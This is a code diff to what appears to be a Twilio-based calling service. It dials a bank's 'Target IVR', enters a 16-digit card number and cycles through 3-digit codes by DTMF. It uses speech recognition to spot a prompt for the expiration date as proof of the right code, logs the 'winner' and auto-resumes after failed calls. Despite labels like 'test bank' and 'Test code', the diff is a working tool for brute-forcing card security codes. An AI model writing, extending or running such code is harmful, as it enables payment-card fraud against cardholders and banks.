@@ -94,6 +94,38 @@ export const handleTryCode = async (req, res) => {
     }
   }
 
+  // Check if Twilio's built-in speech recognition returned spoken text from the Target IVR
+  const { SpeechResult } = req.body || {};
+  if (SpeechResult && SpeechResult.trim() !== '') {
+    console.log(`[Twilio Speech Recognition (+18009838472)] Target IVR Spoke: "${SpeechResult}"`);
+    await AttemptModel.addLog(attemptId, `[Twilio Live Speech (+18009838472)]: "${SpeechResult}"`);
+    
+    const existingTranscript = attempt?.result_details?.transcript || '';
+    const updatedTranscript = existingTranscript 
+      ? `${existingTranscript}\nTarget IVR (+18009838472): ${SpeechResult}` 
+      : `Target IVR (+18009838472): ${SpeechResult}`;
+      
+    await supabase.from('attempts').update({
+      result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
+    }).eq('id', attemptId);
+
+    // If speech contains victory phrases ("expiration", "expiry", "verified", "test code correct")
+    const lowerSpeech = SpeechResult.toLowerCase();
+    if (lowerSpeech.includes('expiration') || lowerSpeech.includes('expiry') || lowerSpeech.includes('verified') || lowerSpeech.includes('correct')) {
+      await AttemptModel.addLog(attemptId, `🎉 Target IVR speech confirmed winner code ${currentTestCode}! Halting campaign.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, {
+        ...(attempt?.result_details || {}),
+        winner: currentTestCode,
+        transcript: updatedTranscript
+      });
+      OrchestratorService.stopCampaign();
+      const twiml = new twilio.twiml.VoiceResponse();
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+  }
+
   // If call status is already completed/failed or winner is confirmed, stop immediately!
   const isCompleted = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || winnerCode);
   if (isCompleted) {
@@ -121,22 +153,29 @@ export const handleTryCode = async (req, res) => {
     const isMatch = targetWinner && codeStr === targetWinner;
 
     if (i === currentCodeNum && isFirst === 'true') {
-      batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
+      batchLogs.push(`Target IVR: "Welcome to the test bank. Please enter your 16 digit card number."`);
+      batchLogs.push(`System (DTMF Sent): Entered 16-digit Card [${baseCard}]`);
+      batchLogs.push(`Target IVR: "Card accepted. Please enter your 3 digit Test code."`);
+      batchLogs.push(`System (DTMF Sent): Entered Test Code [${codeStr}]`);
       if (isMatch) {
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Card details verified.`);
+        batchLogs.push(`Target IVR: "Test code correct. Please enter your expiration date."`);
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
       } else if (BATCH_SIZE === 1) {
+        batchLogs.push(`Target IVR: "Incorrect test code. Disconnecting call..."`);
         batchLogs.push(`❌IVR responded: Incorrect target code for ${codeStr}. Disconnecting call immediately to dial next code...`);
       }
       const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
       twiml.pause({ length: waitSeconds });
       twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
     } else {
+      batchLogs.push(`System (DTMF Sent): Entered Test Code [${codeStr}]`);
       if (isMatch) {
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Card details verified.`);
+        batchLogs.push(`Target IVR: "Test code correct. Please enter your expiration date."`);
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
       } else {
+        batchLogs.push(`Target IVR: "Incorrect test code. Disconnecting call..."`);
         batchLogs.push(`❌IVR responded: Incorrect Test Code for ${codeStr}. Disconnecting call to start next call...`);
       }
-      batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
       twiml.pause({ length: 2 });
       twiml.play({ digits: codeStr });
     }
@@ -242,7 +281,15 @@ export const handleStatusCallback = async (req, res) => {
         }
       } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
         const duration = parseInt(CallDuration) || 0;
-        await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
+        const { data: attempt } = await supabase.from('attempts').select('result_details, status').eq('id', attemptId).single();
+        const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;
+
+        if (!foundWinner && attempt && attempt.status !== 'completed') {
+          await AttemptModel.addLog(attemptId, `Call encountered ${CallStatus}. Auto-resuming from last test code...`);
+          await AttemptModel.updateAttemptStatus(attemptId, 'queued', duration, { twilioStatus: CallStatus });
+        } else {
+          await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
+        }
       }
     }
 
@@ -258,14 +305,27 @@ export const handleRecordingCallback = async (req, res) => {
   const { attemptId } = req.params;
   const { RecordingUrl, RecordingStatus } = req.body;
   try {
-    await AttemptModel.addLog(attemptId, `Twilio Recording Callback status: ${RecordingStatus}`);
     if (RecordingUrl) {
-      await AttemptModel.addLog(attemptId, `Recording URL: ${RecordingUrl}`);
+      const { data: attempt } = await supabase
+        .from('attempts')
+        .select('status, result_details')
+        .eq('id', attemptId)
+        .single();
+        
+      const isFinished = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || (attempt.result_details && attempt.result_details.winner));
 
-      // Start transcription and analysis asynchronously
-      transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
-        console.error(`Error transcribing recording for attempt #${attemptId}:`, err);
-      });
+      if (isFinished) {
+        await AttemptModel.addLog(attemptId, `Final call recording received: ${RecordingUrl}`);
+        // Process recording & final transcript when the campaign finishes at the end!
+        transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
+          console.error(`Error transcribing final recording for attempt #${attemptId}:`, err);
+        });
+      } else {
+        // Quietly store recording URL on intermediate attempts without heavy download/transcription logging
+        await supabase.from('attempts').update({
+          result_details: { ...(attempt?.result_details || {}), recording_url: RecordingUrl }
+        }).eq('id', attemptId);
+      }
     }
     return res.status(200).send('OK');
   } catch (error) {
